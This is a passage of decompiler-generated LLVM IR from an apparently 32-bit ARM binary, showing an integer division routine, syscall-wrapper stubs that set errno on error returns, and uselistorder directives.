  uselistorder i32 %v1_ff38, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_ff38, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_ff2c, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_ffc4, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_ff80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ff6cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_10028(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10028:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_1002c = call i32 @function_ff2c()
  ret i32 %v0_1002c
}

define i32 @function_10040() local_unnamed_addr {
dec_label_pc_10040:
  %v0_10040 = load i32, i32* @r1, align 4
  %v1_10040 = icmp slt i32 %v0_10040, 0
  %v2_10040 = icmp eq i32 %v0_10040, 0
  %v0_10044 = load i32, i32* @r0, align 4
  %v2_10044 = xor i32 %v0_10044, %v0_10040
  br i1 %v2_10040, label %dec_label_pc_10158, label %dec_label_pc_1004c

dec_label_pc_1004c:                               ; preds = %dec_label_pc_10040
  br i1 %v1_10040, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1004c
  %v2_1004c = sub i32 0, %v0_10040
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1004c, %bb
  %v1_10118 = phi i32 [ %v2_1004c, %bb ], [ %v0_10040, %dec_label_pc_1004c ]
  %v1_10050 = add i32 %v1_10118, -1
  %v7_10050 = icmp eq i32 %v1_10118, 1
  br i1 %v7_10050, label %dec_label_pc_100f8, label %dec_label_pc_10058

dec_label_pc_10058:                               ; preds = %thread-pre-split
  %v1_10058 = icmp slt i32 %v0_10044, 0
  br i1 %v1_10058, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_10058
  %v2_1005c = sub i32 0, %v0_10044
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_10058, %bb84
  %v0_1014c = phi i32 [ %v0_10044, %dec_label_pc_10058 ], [ %v2_1005c, %bb84 ]
  %v3_10060 = icmp uge i32 %v0_1014c, %v1_10118
  %v9_10060 = icmp eq i32 %v0_1014c, %v1_10118
  %v2_10064 = xor i1 %v3_10060, true
  %v3_10064 = or i1 %v9_10060, %v2_10064
  br i1 %v3_10064, label %dec_label_pc_10104, label %dec_label_pc_10068

dec_label_pc_10068:                               ; preds = %bb85
  %v2_10068 = and i32 %v1_10050, %v1_10118
  %v4_10068 = icmp eq i32 %v2_10068, 0
  br i1 %v4_10068, label %dec_label_pc_10114, label %dec_label_pc_10070

dec_label_pc_10070:                               ; preds = %dec_label_pc_10068
  %v3_10070 = icmp ult i32 %v1_10118, 536870912
  br i1 %v3_10070, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10070
  %v4_10074 = mul i32 %v1_10118, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10070, %.thread
  %v0_10094.pr40.ph = phi i32 [ %v4_10074, %.thread ], [ %v1_10118, %dec_label_pc_10070 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10070 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_10094.pr40 = phi i32 [ %v4_10088, %bb88 ], [ %v0_10094.pr40.ph, %.preheader.preheader ]
  %v1_1008c = phi i32 [ %v4_1008c, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_10080 = icmp ugt i32 %v0_10094.pr40, 268435455
  br i1 %v2_10080, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_10094thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_10084 = icmp ult i32 %v0_10094.pr40, %v0_1014c
  br i1 %v4_10084, label %bb87, label %dec_label_pc_10094thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_10088 = and i32 %v0_10094.pr40, 268435456
  %v3_10088 = icmp eq i32 %v2_10088, 0
  %v4_10088 = mul i32 %v0_10094.pr40, 16
  br i1 %v3_10088, label %bb88, label %dec_label_pc_10094.loopexit

bb88:                                             ; preds = %bb87
  %v2_1008c = and i32 %v1_1008c, 268435456
  %v3_1008c = icmp eq i32 %v2_1008c, 0
  %v4_1008c = mul i32 %v1_1008c, 16
  br i1 %v3_1008c, label %.preheader, label %dec_label_pc_10094thread-pre-split.loopexit.loopexit

dec_label_pc_10094thread-pre-split.loopexit.loopexit: ; preds = %bb88, %bb86
  %v1_100a052.ph = phi i32 [ %v1_1008c, %bb86 ], [ %v4_1008c, %bb88 ]
  %v0_10094.pr42.ph = phi i32 [ %v0_10094.pr40, %bb86 ], [ %v4_10088, %bb88 ]
  br label %dec_label_pc_10094thread-pre-split.loopexit

dec_label_pc_10094thread-pre-split.loopexit:      ; preds = %dec_label_pc_10094thread-pre-split.loopexit.loopexit, %.thread3
  %v1_100a052 = phi i32 [ %v1_1008c, %.thread3 ], [ %v1_100a052.ph, %dec_label_pc_10094thread-pre-split.loopexit.loopexit ]
  %v0_10094.pr42 = phi i32 [ %v0_10094.pr40, %.thread3 ], [ %v0_10094.pr42.ph, %dec_label_pc_10094thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_10094thread-pre-split

dec_label_pc_10094thread-pre-split:               ; preds = %dec_label_pc_10094thread-pre-split.loopexit, %bb90
  %v1_100a050 = phi i32 [ %v1_100a052, %dec_label_pc_10094thread-pre-split.loopexit ], [ %v3_100a0, %bb90 ]
  %v2_1009848 = phi i32 [ %v0_1014c, %dec_label_pc_10094thread-pre-split.loopexit ], [ %v2_10098, %bb90 ]
  %v0_10094.pr = phi i32 [ %v0_10094.pr42, %dec_label_pc_10094thread-pre-split.loopexit ], [ %v3_1009c, %bb90 ]
  br label %dec_label_pc_10094

dec_label_pc_10094.loopexit:                      ; preds = %bb87
  br label %dec_label_pc_10094

dec_label_pc_10094:                               ; preds = %dec_label_pc_10094.loopexit, %dec_label_pc_10094thread-pre-split
  %v1_100a0 = phi i32 [ %v1_100a050, %dec_label_pc_10094thread-pre-split ], [ %v1_1008c, %dec_label_pc_10094.loopexit ]
  %v2_10098 = phi i32 [ %v2_1009848, %dec_label_pc_10094thread-pre-split ], [ %v0_1014c, %dec_label_pc_10094.loopexit ]
  %v1_1009c = phi i32 [ %v0_10094.pr, %dec_label_pc_10094thread-pre-split ], [ %v4_10088, %dec_label_pc_10094.loopexit ]
  %v2_10094 = icmp slt i32 %v1_1009c, 0
  br i1 %v2_10094, label %dec_label_pc_100a8, label %bb89

bb89:                                             ; preds = %dec_label_pc_10094
  %v4_10098 = icmp ult i32 %v1_1009c, %v2_10098
  br i1 %v4_10098, label %bb90, label %dec_label_pc_100a8

bb90:                                             ; preds = %bb89
  %v3_1009c = mul i32 %v1_1009c, 2
  %v2_100a0 = icmp slt i32 %v1_100a0, 0
  %v3_100a0 = mul i32 %v1_100a0, 2
  br i1 %v2_100a0, label %dec_label_pc_100a8, label %dec_label_pc_10094thread-pre-split

dec_label_pc_100a8:                               ; preds = %bb89, %dec_label_pc_10094, %bb90
  %v2_100b463 = phi i32 [ %v3_100a0, %bb90 ], [ %v1_100a0, %bb89 ], [ %v1_100a0, %dec_label_pc_10094 ]
  %v1_100ac55 = phi i32 [ %v3_1009c, %bb90 ], [ %v1_1009c, %bb89 ], [ %v1_1009c, %dec_label_pc_10094 ]
  br label %dec_label_pc_100ac

dec_label_pc_100ac:                               ; preds = %.thread13, %dec_label_pc_100a8
  %v1_100e0 = phi i32 [ %v4_100e0, %.thread13 ], [ %v2_100b463, %dec_label_pc_100a8 ]
  %v1_100b4 = phi i32 [ %v1_100f0, %.thread13 ], [ 0, %dec_label_pc_100a8 ]
  %v1_100e4 = phi i32 [ %v4_100e4, %.thread13 ], [ %v1_100ac55, %dec_label_pc_100a8 ]
  %v1_100b0 = phi i32 [ %v0_100dc, %.thread13 ], [ %v0_1014c, %dec_label_pc_100a8 ]
  %v3_100ac = icmp ult i32 %v1_100b0, %v1_100e4
  br i1 %v3_100ac, label %.thread8, label %bb91

bb91:                                             ; preds = %dec_label_pc_100ac
  %v3_100b0 = sub i32 %v1_100b0, %v1_100e4
  %v3_100b4 = or i32 %v1_100b4, %v1_100e0
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_100ac, %bb91
  %v1_100bc = phi i32 [ %v1_100b0, %dec_label_pc_100ac ], [ %v3_100b0, %bb91 ]
  %v1_100c0 = phi i32 [ %v1_100b4, %dec_label_pc_100ac ], [ %v3_100b4, %bb91 ]
  %v4_100b8 = udiv i32 %v1_100e4, 2
  %v6_100b8 = icmp ult i32 %v1_100bc, %v4_100b8
  br i1 %v6_100b8, label %.thread9, label %bb92

bb92:                                             ; preds = %.thread8
  %v3_100bc = urem i32 %v1_100e4, 2
  %v4_100bc = icmp eq i32 %v3_100bc, 0
  %v6_100bc = sub i32 %v1_100bc, %v4_100b8
  br i1 %v4_100bc, label %.thread9, label %bb93

bb93:                                             ; preds = %bb92
  %v5_100c0 = udiv i32 %v1_100e0, 2
  %v6_100c0 = or i32 %v1_100c0, %v5_100c0
  br label %.thread9

.thread9:                                         ; preds = %bb92, %.thread8, %bb93
  %v1_100c8 = phi i32 [ %v6_100bc, %bb92 ], [ %v1_100bc, %.thread8 ], [ %v6_100bc, %bb93 ]
  %v1_100cc = phi i32 [ %v1_100c0, %bb92 ], [ %v1_100c0, %.thread8 ], [ %v6_100c0, %bb93 ]
  %v4_100c4 = udiv i32 %v1_100e4, 4
  %v6_100c4 = icmp ult i32 %v1_100c8, %v4_100c4
  br i1 %v6_100c4, label %.thread10, label %bb94

bb94:                                             ; preds = %.thread9
  %v3_100c8 = and i32 %v1_100e4, 2
  %v4_100c8 = icmp eq i32 %v3_100c8, 0
  %v6_100c8 = sub i32 %v1_100c8, %v4_100c4
  br i1 %v4_100c8, label %.thread10, label %bb95

bb95:                                             ; preds = %bb94
  %v5_100cc = udiv i32 %v1_100e0, 4
  %v6_100cc = or i32 %v1_100cc, %v5_100cc
  br label %.thread10

.thread10:                                        ; preds = %bb94, %.thread9, %bb95
  %v1_100d4 = phi i32 [ %v6_100c8, %bb94 ], [ %v1_100c8, %.thread9 ], [ %v6_100c8, %bb95 ]
  %v1_100d8 = phi i32 [ %v1_100cc, %bb94 ], [ %v1_100cc, %.thread9 ], [ %v6_100cc, %bb95 ]
  %v4_100d0 = udiv i32 %v1_100e4, 8
  %v6_100d0 = icmp ult i32 %v1_100d4, %v4_100d0
  br i1 %v6_100d0, label %thread-pre-split12, label %bb96

bb96:                                             ; preds = %.thread10
  %v3_100d4 = and i32 %v1_100e4, 4
  %v4_100d4 = icmp eq i32 %v3_100d4, 0
  %v6_100d4 = sub i32 %v1_100d4, %v4_100d0
  br i1 %v4_100d4, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %bb96
  %v5_100d8 = udiv i32 %v1_100e0, 8
  %v6_100d8 = or i32 %v1_100d8, %v5_100d8
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb97, %.thread10, %bb96
  %v1_100f0 = phi i32 [ %v1_100d8, %bb96 ], [ %v1_100d8, %.thread10 ], [ %v6_100d8, %bb97 ]
  %v0_100dc = phi i32 [ %v6_100d4, %bb96 ], [ %v1_100d4, %.thread10 ], [ %v6_100d4, %bb97 ]
  %v2_100dc = icmp eq i32 %v0_100dc, 0
  br i1 %v2_100dc, label %dec_label_pc_100ec, label %bb98

bb98:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_100e0, 16
  br i1 %tmp, label %dec_label_pc_100ec, label %.thread13

.thread13:                                        ; preds = %bb98
  %v4_100e0 = udiv i32 %v1_100e0, 16
  %v4_100e4 = udiv i32 %v1_100e4, 16
  br label %dec_label_pc_100ac

dec_label_pc_100ec:                               ; preds = %thread-pre-split12, %bb98
  %v1_100ec = icmp slt i32 %v2_10044, 0
  br i1 %v1_100ec, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_100ec
  %v2_100f0 = sub i32 0, %v1_100f0
  br label %.thread16

.thread16:                                        ; preds = %bb103, %bb102, %bb100, %dec_label_pc_100f8, %dec_label_pc_100ec, %bb99
  %v1_100f4 = phi i32 [ %v1_100f0, %dec_label_pc_100ec ], [ %v2_100f0, %bb99 ], [ %v2_100fc, %bb100 ], [ undef, %dec_label_pc_100f8 ], [ %v1_1011080, %bb102 ], [ %v2_1010c, %bb103 ]
  ret i32 %v1_100f4

dec_label_pc_100f8:                               ; preds = %thread-pre-split
  br i1 %v1_10040, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_100f8
  %v2_100fc = sub i32 0, %v0_10044
  br label %.thread16

dec_label_pc_10104:                               ; preds = %bb85
  br i1 %v3_10060, label %bb102, label %bb101

bb101:                                            ; preds = %dec_label_pc_10104
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_10104, %bb101
  %v1_1011080 = phi i32 [ %v0_10044, %dec_label_pc_10104 ], [ 0, %bb101 ]
  br i1 %v9_10060, label %bb103, label %.thread16

bb103:                                            ; preds = %bb102
  %v4_10108 = ashr i32 %v2_10044, 31
  %v2_1010c = or i32 %v4_10108, 1
  br label %.thread16

dec_label_pc_10114:                               ; preds = %dec_label_pc_10068
  %v2_10114 = icmp ugt i32 %v1_10118, 65535
  br i1 %v2_10114, label %bb104, label %.thread19

bb104:                                            ; preds = %dec_label_pc_10114
  %v2_10118 = and i32 %v1_10118, 32768
  %v3_10118 = icmp eq i32 %v2_10118, 0
  %v4_10118 = udiv i32 %v1_10118, 65536
  br i1 %v3_10118, label %.thread19, label %bb105

.thread19:                                        ; preds = %bb104, %dec_label_pc_10114
  %v0_1012470 = phi i32 [ %v1_10118, %dec_label_pc_10114 ], [ %v4_10118, %bb104 ]
  br label %bb105

bb105:                                            ; preds = %bb104, %.thread19
  %v1_10128 = phi i32 [ %v0_1012470, %.thread19 ], [ %v4_10118, %bb104 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb104 ]
  %v2_10124 = icmp ugt i32 %v1_10128, 255
  br i1 %v2_10124, label %bb106, label %.thread20

bb106:                                            ; preds = %bb105
  %v2_10128 = and i32 %v1_10128, 128
  %v3_10128 = icmp eq i32 %v2_10128, 0
  %v4_10128 = udiv i32 %v1_10128, 256
  br i1 %v3_10128, label %.thread20, label %bb107

bb107:                                            ; preds = %bb106
  %v2_1012c = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb106, %bb105, %bb107
  %v1_10138 = phi i32 [ %storemerge, %bb105 ], [ %storemerge, %bb106 ], [ %v2_1012c, %bb107 ]
  %v1_10134 = phi i32 [ %v1_10128, %bb105 ], [ %v4_10128, %bb106 ], [ %v4_10128, %bb107 ]
  %v2_10130 = icmp ugt i32 %v1_10134, 15
  br i1 %v2_10130, label %bb108, label %.thread21

bb108:                                            ; preds = %.thread20
  %v2_10134 = and i32 %v1_10134, 8
  %v3_10134 = icmp eq i32 %v2_10134, 0
  %v4_10134 = udiv i32 %v1_10134, 16
  br i1 %v3_10134, label %.thread21, label %bb109

bb109:                                            ; preds = %bb108
  %v2_10138 = add nsw i32 %v1_10138, 4
  br label %.thread21

.thread21:                                        ; preds = %bb108, %.thread20, %bb109
  %v4_10140 = phi i32 [ %v1_10138, %.thread20 ], [ %v1_10138, %bb108 ], [ %v2_10138, %bb109 ]
  %v5_10144 = phi i32 [ %v1_10134, %.thread20 ], [ %v4_10134, %bb108 ], [ %v4_10134, %bb109 ]
  %v2_1013c = icmp ugt i32 %v5_10144, 3
  %v7_1013c = icmp eq i32 %v5_10144, 4
  %v2_10140 = xor i1 %v7_1013c, true
  %v3_10140 = and i1 %v2_1013c, %v2_10140
  br i1 %v3_10140, label %bb110, label %bb111

bb110:                                            ; preds = %.thread21
  %v5_10140 = add nsw i32 %v4_10140, 3
  br label %bb111

bb111:                                            ; preds = %.thread21, %bb110
  %v4_10144 = phi i32 [ %v4_10140, %.thread21 ], [ %v5_10140, %bb110 ]
  %v2_10144 = xor i1 %v2_1013c, true
  %v3_10144 = or i1 %v7_1013c, %v2_10144
  br i1 %v3_10144, label %bb112, label %bb113

bb112:                                            ; preds = %bb111
  %v8_10144 = udiv i32 %v5_10144, 2
  %v9_10144 = add i32 %v4_10144, %v8_10144
  br label %bb113

bb113:                                            ; preds = %bb111, %bb112
  %v1_1014c = phi i32 [ %v4_10144, %bb111 ], [ %v9_10144, %bb112 ]
  %v1_10148 = icmp slt i32 %v2_10044, 0
  %v6_1014c = lshr i32 %v0_1014c, %v1_1014c
  %v2_10150 = sub i32 0, %v6_1014c
  %v2_10150.v6_1014c = select i1 %v1_10148, i32 %v2_10150, i32 %v6_1014c
  ret i32 %v2_10150.v6_1014c

dec_label_pc_10158:                               ; preds = %dec_label_pc_10040
  %v0_1015c = call i32 @function_10184()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_10144, { 1, 0 }
  uselistorder i1 %v7_1013c, { 1, 0 }
  uselistorder i32 %v4_10134, { 1, 0 }
  uselistorder i32 %v1_10134, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10128, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_10128, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10118, { 1, 0 }
  uselistorder i32 %v0_100dc, { 1, 0 }
  uselistorder i32 %v4_100d0, { 1, 0 }
  uselistorder i32 %v1_100d8, { 1, 2, 0 }
  uselistorder i32 %v4_100c4, { 1, 0 }
  uselistorder i32 %v1_100cc, { 1, 2, 0 }
  uselistorder i32 %v4_100b8, { 1, 0 }
  uselistorder i32 %v1_100c0, { 1, 2, 0 }
  uselistorder i32 %v1_100e4, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_100b4, { 1, 0 }
  uselistorder i32 %v1_100e0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_100a0, { 1, 0 }
  uselistorder i32 %v3_1009c, { 1, 0 }
  uselistorder i32 %v1_1009c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_10098, { 1, 0 }
  uselistorder i32 %v1_100a0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1008c, { 1, 0 }
  uselistorder i32 %v4_10088, { 2, 1, 0 }
  uselistorder i32 %v1_1008c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_10094.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_10060, { 1, 0 }
  uselistorder i32 %v1_10118, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_10044, { 1, 0, 2 }
  uselistorder i32 %v0_10044, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_10040, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_10184, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %bb111, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_100ec, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_100a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10094thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_1016c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1016c:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_10170 = call i32 @function_10040()
  ret i32 %v0_10170
}

define i32 @function_10184() local_unnamed_addr {
dec_label_pc_10184:
  %v1_1018c = call i32 @function_10e28(i32 8)
  ret i32 %v1_1018c
}

define i32 @function_10198() local_unnamed_addr {
dec_label_pc_10198:
  %v1_101a8 = load i32, i32* @r0, align 4
  ret i32 %v1_101a8
}

define i32 @function_101ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_101ac:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_101ac = load i32, i32* @r7, align 4
  store i32 %v3_101ac, i32* %stack_var_-8, align 4
  %v0_101b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_101b8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_101b8, -4095
  br i1 %tmp, label %dec_label_pc_101d8, label %dec_label_pc_101c8

dec_label_pc_101c8:                               ; preds = %dec_label_pc_101ac
  %v0_101c8 = call i32 @function_10a30()
  %v0_101cc = load i32, i32* %r7.global-to-local, align 4
  %v1_101cc = sub i32 0, %v0_101cc
  %v2_101d0 = inttoptr i32 %v0_101c8 to i32*
  store i32 %v1_101cc, i32* %v2_101d0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_101d8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_101d8

dec_label_pc_101d8:                               ; preds = %dec_label_pc_101ac, %dec_label_pc_101c8
  %v1_101dc = phi i32 [ %v0_101b8, %dec_label_pc_101ac ], [ -1, %dec_label_pc_101c8 ]
  %v2_101d8 = phi i32 [ %v3_101ac, %dec_label_pc_101ac ], [ %v2_101d8.pre, %dec_label_pc_101c8 ]
  store i32 %v2_101d8, i32* @r7, align 4
  ret i32 %v1_101dc

; uselistorder directives
  uselistorder i32 %v0_101b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_101d8, { 1, 0 }
}

define i32 @function_101e0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_101e0:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_101e0 = load i32, i32* @r2, align 4
  %v9_101e0 = load i32, i32* @r3, align 4
  store i32 %v9_101e0, i32* %stack_var_-4, align 4
  %v1_101f0 = and i32 %arg2, 64
  %v2_101f0 = icmp eq i32 %v1_101f0, 0
  br i1 %v2_101f0, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_101e0
  %v3_101f8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_101f8, i32* @r3, align 4
  %phitmp = urem i32 %v6_101e0, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_101e0, %bb
  %v0_101fc = phi i32 [ 0, %dec_label_pc_101e0 ], [ %phitmp, %bb ]
  store i32 %v0_101fc, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1022c, label %dec_label_pc_1021c

dec_label_pc_1021c:                               ; preds = %.thread
  %v0_1021c = call i32 @function_10a30()
  %v0_10220 = load i32, i32* %r7.global-to-local, align 4
  %v1_10220 = sub i32 0, %v0_10220
  store i32 %v1_10220, i32* @r3, align 4
  %v2_10224 = inttoptr i32 %v0_1021c to i32*
  store i32 %v1_10220, i32* %v2_10224, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %.thread, %dec_label_pc_1021c
  %v0_1022c = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_1021c ]
  ret i32 %v0_1022c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1022c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10240() local_unnamed_addr {
dec_label_pc_10240:
  %v1_10250 = load i32, i32* @r0, align 4
  ret i32 %v1_10250
}

define i32 @function_10254(i32* %arg1) local_unnamed_addr {
dec_label_pc_10254:
  %stack_var_-16 = alloca i32, align 4
  %v2_10258 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10268 = call i32 @function_10408(i32 %v2_10258, i32 0)
  %v2_1026c = load i32, i32* %stack_var_-16, align 4
  %v2_10270 = icmp eq i32* %arg1, null
  br i1 %v2_10270, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10254
  store i32 %v2_1026c, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10254, %bb
  ret i32 %v2_1026c

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10284(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10284:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_102b8, label %dec_label_pc_102a8

dec_label_pc_102a8:                               ; preds = %dec_label_pc_10284
  %v0_102a8 = call i32 @function_10a30()
  %v0_102ac = load i32, i32* %r4.global-to-local, align 4
  %v1_102ac = sub i32 0, %v0_102ac
  %v2_102b0 = inttoptr i32 %v0_102a8 to i32*
  store i32 %v1_102ac, i32* %v2_102b0, align 4
  br label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_10284, %dec_label_pc_102a8
  %v1_102c0 = phi i32 [ %arg1, %dec_label_pc_10284 ], [ -1, %dec_label_pc_102a8 ]
  ret i32 %v1_102c0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_102b8, { 1, 0 }
}

define i32 @function_102c4() local_unnamed_addr {
dec_label_pc_102c4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_102c4 = load i32, i32* @r7, align 4
  store i32 %v3_102c4, i32* %stack_var_-8, align 4
  %v0_102d0 = load i32, i32* @r0, align 4
  store i32 %v0_102d0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_102d0, -4095
  br i1 %tmp, label %dec_label_pc_102f0, label %dec_label_pc_102e0

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102c4
  %v0_102e0 = call i32 @function_10a30()
  %v0_102e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_102e4 = sub i32 0, %v0_102e4
  %v2_102e8 = inttoptr i32 %v0_102e0 to i32*
  store i32 %v1_102e4, i32* %v2_102e8, align 4
  %v2_102f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_102f0

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102c4, %dec_label_pc_102e0
  %v1_102f4 = phi i32 [ %v0_102d0, %dec_label_pc_102c4 ], [ -1, %dec_label_pc_102e0 ]
  %v2_102f0 = phi i32 [ %v3_102c4, %dec_label_pc_102c4 ], [ %v2_102f0.pre, %dec_label_pc_102e0 ]
  store i32 %v2_102f0, i32* @r7, align 4
  ret i32 %v1_102f4

; uselistorder directives
  uselistorder i32 %v0_102d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_102f0, { 1, 0 }
}

define i32 @function_102f8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_102f8:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10328, label %dec_label_pc_10318

dec_label_pc_10318:                               ; preds = %dec_label_pc_102f8
  %v0_10318 = call i32 @function_10a30()
  %v0_1031c = load i32, i32* %r4.global-to-local, align 4
  %v1_1031c = sub i32 0, %v0_1031c
  %v2_10320 = inttoptr i32 %v0_10318 to i32*
  store i32 %v1_1031c, i32* %v2_10320, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10328

dec_label_pc_10328:                               ; preds = %dec_label_pc_102f8, %dec_label_pc_10318
  %v0_10328 = phi i32 [ %arg1, %dec_label_pc_102f8 ], [ -1, %dec_label_pc_10318 ]
  ret i32 %v0_10328

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10328, { 1, 0 }
}

define i32 @function_10338(i32 %arg1) local_unnamed_addr {
dec_label_pc_10338:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10338 = load i32, i32* @r7, align 4
  store i32 %v3_10338, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10360, label %dec_label_pc_10350

dec_label_pc_10350:                               ; preds = %dec_label_pc_10338
  %v0_10350 = call i32 @function_10a30()
  %v0_10354 = load i32, i32* %r7.global-to-local, align 4
  %v1_10354 = sub i32 0, %v0_10354
